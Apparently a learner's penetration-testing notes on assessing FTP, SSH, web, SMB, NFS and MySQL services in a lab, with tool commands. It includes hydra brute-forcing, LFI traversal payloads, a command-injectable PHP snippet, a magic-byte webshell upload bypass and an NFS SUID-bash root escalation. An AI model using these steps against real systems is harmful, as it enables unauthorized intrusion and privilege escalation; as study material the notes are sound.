## Vulnerability Assessment 


### Vulns
    - RCE
    - Auth bypass
    - Path Traversal 
    - Authenticated : need login vs Unauthenticated : without login
    - > it's better to find information exposure SSH keys. rather than complicated RCE

    - Misconfiguration 

- through doing assessment,
    - what kind of information can I get? 
    - what type of vulns are there? and how can I exploit?



### FTP 

1. old service version
- searchsploit vsftpd 3.0.3 : known vulns

2. anonymous login 
- 'anonymous:'

3. file upload/download - write/read authority 
- ls > check dir authority 
- get, put /home/kali/123.txt
- Check If it's able to execute the uploaded file on another network services. 
    - e.g. webserver

4. default credentials 
- "vsftpd 3.0.3 default passwords"

### SSH 
- sysadmins use a lot for remote control with file transfer and command execution
- very few vuln due to it's opensource based
- but misconfiguration 
    - e.g. publickey or password login > brute force(one or many users:manypw) or password spraying attack(manyusers:onepw)

#### phases
- vesion, release date
    - known vuln (with searchsploit and `exploit github`)
    - if low version,
    - OpenSSH < 7.7, gathering user name list > brute force : e.g. 2222 SSH > msfconsole, use ssh_enumuser > seclists/Usernames/top-usernames-shortlist.txt 
    - OpenSSH < 6.6old + SFTP, RCE

- scripts
    - method : supported method        
    - /etc/ssh/sshd_config : allowed authentication 

- SSH brute force 
```
hydra -L userlist.txt -P password.txt ssh://IP -s 22 -V -f 
-f : exit when it is found
```


### HTTP/S

1. scripts
  
- http-enum
    - overall
- vuln
    - user found, http-enum, sqli  : better 
    sometimes, takes too much 
    - I don't think vulners result is useful

- when you're in wordpress
    - http-wordpress*(except for brute)
    - wordpress-enum
        - plugins found
    - wordpress-users
        - admin found

- exploit 
    - CSRF, Stored XSS, etc.

2. What do they do
- show and use the functions
- overall : personal blog
- functions : login, etc


3. web version + web framework version
- ctrl+U : 
    - web application/version
    - linked subdirectory, accessible pages
    - annotation
    - js 
- with wappalyzer 
    - language 
    - > known exploit  

4. robots.txt


5. directory bruteforcing (or hidden files )
1. simple
gobuster dir -u http://172.31.227.231/ -w /usr/share/dirb/wordlists/common.txt -t 20 -o simple -f

with file extension
gobuster dir -u http://172.31.227.231/ -w /usr/share/dirb/wordlists/common.txt -t 20 -x php,html,txt -o file -f

2. detailed
gobuster dir -u http://172.31.227.231/ -w /usr/share/dirbuster/wordlists/small -t 20 -o detailed -f

with file extension
gobuster dir -u http://172.31.227.231/ -w /usr/share/dirbuster/wordlists/small -t 20 -x php,html,txt -o detailed_file -f 

later
  `-x bak,bac,zip,back,backup,docs,xlxs,git`

- [+] try non`-f`version when you're looking for extensions



6. Detailed Inspection
- gather userlists or emails shown in the page 
- if not, cewl : gather words in articles 
    - brute forcing
    
- Common vulns check e.g. OWASP top10
    - default credentials 
    - LFI/RFI
    - command injection
    - file upload
    - SQLi
    - CSRF
    - SSRF


- if you meet unusual application first time with login page, search default credential.


- > source and sink
    - Source : input 
        - ex) GET/POST, API request
    - Sink : where these input values are used 
        - ex) logins > db


- burpsuite
    - title hint 
        - ex) wordpress, javascript


- if you meet wordpress, wpscan without password - okay
    - [document](./3-1.%20Vulnerability%20Exploitation.md)


- if you get shell first with file upload, you can check source code
    - wp-config.php > DBcreds 
    - can check plugins

#### wordpress
- wp-login.php 
    - try default creds 
    - password spraying with validuser
    - wpscan > find valid users
    - hydra > find valid users with custom userlists 
        - `hydra -L users.txt -p 'randompwd' `


- user gather >  custom username generator 
    - e.g. first letter and last name linux
        - John Doe > jdoe
    - specifically in AD

### LFI,RFI
- DB credentials : ../../../etc/db/credentials.txt
- uploaded php Webshell or revshell execution : ../../../var/www/html/mal.php 

- notice `?page=index.php` , `?file=file1.php` , etc.

- brute forcing > automation tools
```bash
python3 lfimaps.py -U URL~/?page=include.php [-C COOKIES] -a 
```
- they send the payloads 
    - ex) ../../../../etc/passwd, page=

```bash
python3 lfimaps.py -U "http://172.31.155.162:4280/vulnerabilities/fi/?page=include.php" -C "wordpress_test_cookie=WP+Cookie+check; PHPSESSID=904431db09a425247034e5e3e0562de1; wordpress_logged_in_9e6ede65712295701f371ec48510f545=admin%7C1719866530%7CCU6IgBGo6fhuocb84qGfaMaH75AtrE6Ilv9EMmEXekV%7Cd5f8c517502b04af2beeb1538590fc3a9d727778610af10e5830423ffb057477; wp-settings-time-1=1719693780; security=low" -a
```

### command injection
```php
<?php system("ping -c 4 ".$_GET['ip']);>
```
- meta character
    - ping ; ip a 
    - (also && ||)

- automation
    - payload-list > intruder paste
    - recourse pool > thread 10 or 100, can speed up 


### Go buster
```bash
gobuster dir -u URL -w DIR -s "STATUS CODE e.g. 200,301,302" --exclude-legnth LENGTH
```
- wordlist : 
    - 2.3 small or lowercase 2.3 enough 

```bash
gobuster dir -u "http://172.31.155.162:8081" -w /usr/share/dirbuster/wordlists/
```
- recursive can but don't on gobuster : too many request and time , 
    - of course there're tools ex) dirbuster,   
    - but it's not good >> just assume dir first
        - /wp-content/

    - `-t 20`
        - enough, too much thread more than 60 = docker crash


### File Upload

#### bypass
1. file extension
2. MIME TYPE, content type (maybe they check extension, content-type both or one)
3. magic byte change : when identify only the magic byte(getimagesize : identify magic byte)
    - magic byte png + extension php or 
    - magic byte php, extension png
    - +FLI > even though .png, content webshell php code > executable

```bash
wget "URL" -O image.png
xxd image.png

(head -c 8 png.png;cat webshell.php) > output.php
FLI leverage > ../../uploads/output.png&cmd=ls 
```

- takes a long time> automation tool
    - fuxploider
```bash
python3 fuxploider.py --url http://172.31.188.142:4280/vulnerabilities/upload/ --cookies="PHPSESSID=7ab0e8e9c36dd8e373050f78b18629d5; security=medium" --not-regex "not uploaded" -d "Upload=Upload"
```

### SMB 445 (mostly Windows)
- Server Message Block known as CIFS(Common Internet File System), made for accessing to printer resources in internet network, used for sharing files in the workplace 
- Share file printer, but can remote control and commands 
- Null session : without credential, can access > upload/download 
- Share-directory-file 
- if get some user credentials, check if there's any share/dir can access 
- SMB vulns a lot (win- MS~, linux - Samba)
- `nmap -p 445 -sV -sC -Pn 172.31.188.142 -n `


1. enum4linux : samba or SMB information gathering tool in Linux
```bash
enum4linux -a 172.31.188.142 : all
```
- output too many
- null session check, allows user no credentials
- windows > linux : Windows more informations 

```
print$
IPC$
: default usually ignore
samba-share 
: mapping, listening OK - read, writable N/A - write X
```

enumeration of local account users name takes a long time but important, netexec(from crackmapexec)

2. netexec
```bash
sudo pip3 install pipx : python module
pipx install git+NetExec 

netexec(nxc) smb 172.31.188.142 

netexec smb 172.31.188.142 -u '' -p '' : null session O
netexec smb 172.31.188.142 -u '' -p '' --shares
```
- AC or network based pentesting too many use
- enum4linux alternative



3. smbmap

```bash
smbmap -H 172.31.188.142 : share, null session authentication 
```

- actual connection 
```
smbclient \\\\172.31.188.142\\samba-share -U ""
```
- can get SSH public key, but private key access denied

```
nmap -p 445 -sS -Pn -n --script="smb-vuln*" 172.31.188.142
```
- not many results casue it's samba = smb in linux 
    - not found for ms- vulns (win) 
    - if win > smb-vuln scripts necessary.



### NFS (network file system)
- you can mount target's specific dir (if the nfs-server set the mount on /etc/exports)
- mostly, linux or Unix 

- ports
    - 111 - RPCbind or Portmapper : metadata about port or process = information gathering 
    - 2049 - NFS : actual NFS server 


- access control (/etc/exports) :
    - check which directory exposed? which host can accessed? 
    - writable/readable?
    - no_root_sqash

- Misconfiguration
- NO_ROOT_SQUASH : check if it's disable or not by writing txt files 
    - can read/write as root = you can upload anything as root > set SUID to binary file (it's not worked for shell script or python script) 
        - even though I'm root in my host on the mount, I can get a root priv on the mount = writable
    HOST : 
    `cp /bin/bash .`
    `chmod +s /bin/bash`
    TARGET: 
    `./bash -p` 
    or 
    `./python3 -c 'import os; os.execl("/bin/sh", "sh", "-p")'`
        - normal shell doesn't work

    

- NFS nobody = low level



- scripts
    - nfs-showmount : mount or direcctory exposed, specific IP whitelist /16 = misconfiguration
    - nsf-ls: ls
    - nfs-stat: filesystem name, storage
    - rpcinfo : what service are working in ports
```
sudo nmap -p 111,2049 -Pn -n -sV --script="nfs-*" 172.31.188.142 : some scripts not working right away, try it several times
```


- showmount
```
showmount -e 172.31.188.142 : 
check specific directory list where mount is possible   
-d : directories , -a : all

sometimes not working well, but in local, working well
```


- to use mount
```
cd /mnt
sudo mkdir test
sudo mount 172.31.188.142:/public-nfs /mnt/test
> upload/download, cp, cat can
```

- to export filesystem as nfs-server
```
apt install nfs-kernel-server
service nfs-kernel-server start 
or 
service nfs-server start 

mkdir /scratch
vi /etc/exports
    add filesystem to export
sudo exportfs -a : send all data to kernel
```

### MySQL(My-Structured Query Language : Database) 3360
- MySQL too updated, not too many vulns 
1. version, hostname check
2. access control and default credentials
    - (root:'', root:root, root:password) when remote control, if they set default credentials, or simple one
3. remote access possible (IP whitelist X)
    - which info we can get? - 
        - user account, 
        - encryption-at-rest : encrypted?, password hashed?(plain), weak hash algo > hash cracking
4. credentials > creds stuffing 


33060, 33061 two Servers
```
nmap -p 33060, 33061 -Pn -n -sV -sC --script="mysql-*" 172.31.188.142 
: find Users lists - no credentials : but false positive, info 
```
```
mysql -u root -p -h 172.31.188.142 -P 33060 
    -p : later password input > no password
    but root:root 
```

- get creds > SSH or web
    - hash-identifier  : MD5 or MD4 - Windows MThash  > MD5 too old, crackable(unhash)


### Vulnerability asessment scanner
- auto - massive coverage
- manual - make sure, false positive

- scanner tools
    - Nessus : many use, but less accuracy
    - Nuclei 
    - Nikto
    - ..


#### Nuclei (Web strongly)
- yaml file based 

```
sudo apt install golang-go -y 
go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest

export PATH to Kali

echo 'export PATH=/home/kali/go/bin:$PATH' >> ~/.zshrc
source ~/.zshrc

nuclei -u IP OR WEB:PORT
nuclei -u http://172.31.188.142:8081
```
- templates a lot (~/.local/nuclei-templates)

- wordpress usernames /wp-json
- backend database dump file : dump.sql  > creds acquired > admin login

- info gathering auto 

```
nuclei -u http://172.31.181.133:8081 -as
autoscanning : technical based scan by using with Wappalyzer. useful

nuclei -u 172.31.181.133:2100 -et http/
FTP > exclude templates  
SSH SMB etc. 
```

#### Nikto (Web app, server)
- Multi-page Application(MPA) vulns scan well 
    - Single(Java based) can't well 
- efficient and very fast, but old and not often developed
```
nikto -host 172.31.181.133:8081
```



#### cewl
- Custom wordlist generator
- I need creds > make password lists with blog article's words
    - but it's way better to put the words lists to passwords because it's not like a actual users
    
```
cewl -d 2 -m 5 -w words.cewl http://172.31.168.90
:depth 2 default (2) 
minimum word length 5

cewl -w words.cewl http://172.31.168.90

cewl -o -w words3.cewl http://172.31.227.231/assets/fonts/blog
-o : extract from the external internet

```
